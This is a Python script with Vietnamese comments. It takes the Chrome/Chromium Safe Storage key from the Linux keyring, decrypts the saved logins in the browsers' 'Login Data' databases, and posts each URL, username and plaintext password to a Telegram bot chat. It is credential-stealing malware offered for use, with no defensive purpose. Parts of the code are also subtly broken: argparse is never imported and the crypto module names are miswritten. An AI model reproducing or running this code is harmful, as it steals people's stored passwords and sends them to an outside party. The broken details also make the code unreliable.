import sys
# Đảm bảo thư mục tạm nằm trong danh sách tìm kiếm (dự phòng thêm)
sys.path.append('/tmp/lib')

try:
    from Cryptodome.cipher import AES
except ImportError:
    from cryptodomex.cipher import AES
import os
import sqlite3
import requests
import secretstorage
# ... các phần còn lại giữ nguyên
from cryptodomex.cipher import AES

def get_key():
    try:
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage' or item.get_label() == 'Chromium Safe Storage':
                return item.get_secret()
    except:
        pass
    return b'peanuts' # Fallback cho các hệ thống không có Keyring

def decrypt_val(buff, key):
    try:
        iv = b' ' * 16
        cipher = AES.new(key[:16], AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(buff)
        return decrypted[:-decrypted[-1]].decode('utf-8')
    except:
        return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--token')
    parser.add_argument('--chatid')
    args = parser.parse_args()

    # Các đường dẫn phổ biến trên Linux
    paths = [
        '~/.config/google-chrome/Default/Login Data',
        '~/.config/google-chrome/Profile 1/Login Data',
        '~/.config/chromium/Default/Login Data'
    ]
    
    key = get_key()
    output = "--- LOGS ---\n"

    for p in paths:
        full_path = os.path.expanduser(p)
        if os.path.exists(full_path):
            # Copy ra file tạm để tránh lỗi "Database is locked" nếu Chrome đang mở
            temp_db = "/tmp/t_db"
            os.system(f"cp '{full_path}' {temp_db}")
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for url, user, password in cursor.fetchall():
                if user and password:
                    # Bỏ 3 ký tự đầu (v11/v10)
                    dec = decrypt_val(password[3:], key)
                    if dec:
                        output += f"U: {url}\nL: {user}\nP: {dec}\n\n"
            conn.close()
            os.remove(temp_db)

    # Gửi kết quả (Nếu quá dài sẽ chia nhỏ, nhưng ở đây gửi trực tiếp)
    if len(output) > 20:
        requests.post(f"https://api.telegram.org/bot{args.token}/sendMessage", 
                      data={'chat_id': args.chatid, 'text': output})

if __name__ == "__main__":
    main()
